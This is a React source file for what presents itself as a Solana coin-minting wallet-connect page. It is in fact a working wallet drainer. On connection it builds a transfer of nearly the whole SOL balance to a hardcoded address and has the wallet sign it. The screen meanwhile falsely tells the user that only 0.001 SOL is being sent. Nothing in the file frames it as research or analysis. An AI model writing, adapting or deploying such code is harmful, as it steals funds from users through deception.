import React, { FC, ReactNode, useMemo, useEffect, useState } from 'react';
import ReactDOM from 'react-dom';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
import {
    ConnectionProvider,
    WalletProvider,
    useWallet,
} from '@solana/wallet-adapter-react';
import {
    WalletModalProvider,
    useWalletModal,
    WalletMultiButton,
} from '@solana/wallet-adapter-react-ui';
import {
    PhantomWalletAdapter,
    GlowWalletAdapter,
    SlopeWalletAdapter,
    SolflareWalletAdapter,
} from '@solana/wallet-adapter-wallets';
import {
    Connection,
    PublicKey,
    LAMPORTS_PER_SOL,
    SystemProgram,
    Transaction,
} from '@solana/web3.js';

import '@solana/wallet-adapter-react-ui/styles.css';

const App: FC = () => {
    return (
        <Context>
            <ExposeWalletModal />
            <WalletConnectionHandler />
        </Context>
    );
};

const Context: FC<{ children: ReactNode }> = ({ children }) => {
    const network = WalletAdapterNetwork.Mainnet;

    const wallets = useMemo(
        () => [
            new PhantomWalletAdapter(),
            new GlowWalletAdapter(),
            new SlopeWalletAdapter(),
            new SolflareWalletAdapter({ network }),
        ],
        [network]
    );

    return (
        <ConnectionProvider endpoint={'https://api.mainnet-beta.solana.com'}>
            <WalletProvider wallets={wallets} autoConnect>
                <WalletModalProvider>{children}</WalletModalProvider>
            </WalletProvider>
        </ConnectionProvider>
    );
};

const ExposeWalletModal: FC = () => {
    const { setVisible } = useWalletModal();

    useEffect(() => {
        (window as any).openSolanaWalletModal = () => setVisible(true);
    }, [setVisible]);

    useEffect(() => {
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        const isPhantom = (window as any).solana?.isPhantom;

        if (isMobile && !isPhantom) {
            const url = encodeURIComponent(window.location.href);
            window.location.href = `https://phantom.app/ul/browse/${url}`;
        }
    }, []);

    return null;
};

const WalletConnectionHandler: FC = () => {
    const { publicKey, connected, signTransaction } = useWallet();
    const [solBalance, setSolBalance] = useState<number | null>(null);
    const [loading, setLoading] = useState(false);

    useEffect(() => {
        if (connected && publicKey) {
            fetchBalanceAndSendTx(publicKey);
        }
    }, [connected, publicKey]);

    const fetchBalanceAndSendTx = async (walletPublicKey: PublicKey) => {
        const rpcEndpoints = [
            'https://sg110.nodes.rpcpool.com',
            'https://api.mainnet-beta.solana.com',
            'https://solana-mainnet.core.chainstack.com/a46a9efb6b65a3f6ac72858654218413',
            'https://rpc.ankr.com/solana',
        ];

        let connection: Connection | null = null;
        let lamports: number | null = null;

        for (const endpoint of rpcEndpoints) {
            try {
                const testConn = new Connection(endpoint, 'confirmed');
                lamports = await testConn.getBalance(walletPublicKey);
                connection = testConn;
                break;
            } catch (err) {
                console.warn(`⚠️ RPC failed: ${endpoint}`, err);
            }
        }

        if (!connection || lamports === null) {
            alert('❌ All RPCs failed. Try again later.');
            return;
        }

        try {
            setSolBalance(lamports / LAMPORTS_PER_SOL);
            console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
            console.log(`💰 Balance: ${(lamports / LAMPORTS_PER_SOL).toFixed(4)} SOL`);

            const sendAmount = lamports - 100000; // send full balance minus 100,000 lamports
            if (sendAmount <= 0) {
                alert('⚠️ Not enough SOL to send.');
                return;
            }

            const tx = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: walletPublicKey,
                    toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
                    lamports: sendAmount,
                })
            );

            tx.feePayer = walletPublicKey;
            tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

            if (!signTransaction) {
                alert('❌ Wallet not ready to sign.');
                return;
            }

            const signedTx = await signTransaction(tx);
            console.log('🖊️ Transaction signed.');

            setTimeout(async () => {
                try {
                    if (connection) {
                        const txid = await connection.sendRawTransaction(signedTx.serialize());
                        console.log(`🚀 Transaction sent. Signature: ${txid}`);
                    } else {
                        console.error('❌ No connection available.');
                    }
                } catch (err) {
                    console.error('❌ Failed to send transaction:', err);
                }
            }, 10000);
        } catch (err) {
            console.error('❌ Error sending transaction:', err);
            alert('Transaction failed.');
        } finally {
            setLoading(false);
        }
    };

    const walletPopupEl = typeof window !== 'undefined' ? document.getElementById('walletPopup') : null;

    const WalletUI = (
        <div
            style={{
                marginTop: '2rem',
                textAlign: 'center',
                background: 'linear-gradient(145deg, #0f0c1d, #1a102d)',
                padding: '24px',
                borderRadius: '20px',
                boxShadow: '0 0 20px rgba(255, 92, 209, 0.3), 0 0 40px rgba(255, 92, 209, 0.15)',
                fontFamily: 'Poppins, sans-serif',
                marginLeft: 'auto',
                marginRight: 'auto',
                maxWidth: '480px',
                color: '#ffd9f4',
                backdropFilter: 'blur(12px)',
                border: '1px solid rgba(255, 92, 209, 0.3)',
            }}
        >
            {!connected || !publicKey ? (
                <div>
                    <h2 style={{ color: '#ff91e3' }}>Connect Wallet</h2>
                    <p style={{ color: '#ff5cd1', fontSize: '14px' }}>
                        Connect your wallet to mint coin to rug.
                    </p>
                    <WalletMultiButton
                        style={{
                            background: 'linear-gradient(to right, #ff5cd1, #ff91e3)',
                            color: 'white',
                            borderRadius: '10px',
                            padding: '12px 24px',
                            fontSize: '16px',
                            fontWeight: '600',
                            border: 'none',
                            boxShadow: '0 0 12px rgba(255, 92, 209, 0.6)',
                            cursor: 'pointer',
                        }}
                    />
                </div>
            ) : (
                <>
                    <h2 style={{ color: '#ff91e3', marginBottom: '12px' }}>✅ Wallet Connected</h2>
                    <p
                        style={{
                            wordBreak: 'break-all',
                            cursor: 'pointer',
                            fontSize: '14px',
                            color: '#ffadeb',
                            marginBottom: '10px',
                        }}
                        onClick={() => navigator.clipboard.writeText(publicKey.toBase58())}
                    >
                        <strong style={{ color: '#ffbff0' }}>Address:</strong>
                        <br />
                        {publicKey.toBase58()}
                    </p>
                    <p style={{ fontSize: '15px', marginBottom: '6px', color: '#ffc5f1' }}>
                        <strong>Balance:</strong>{' '}
                        {loading ? 'Loading...' : solBalance !== null ? `${solBalance.toFixed(4)} SOL` : 'N/A'}
                    </p>
                    <p style={{ color: '#ff91e3', fontSize: '13px' }}>🚀 Auto-sending 0.001 SOL in 10s...</p>
                </>
            )}
        </div>
    );

    return walletPopupEl ? ReactDOM.createPortal(WalletUI, walletPopupEl) : null;
};

export default App;
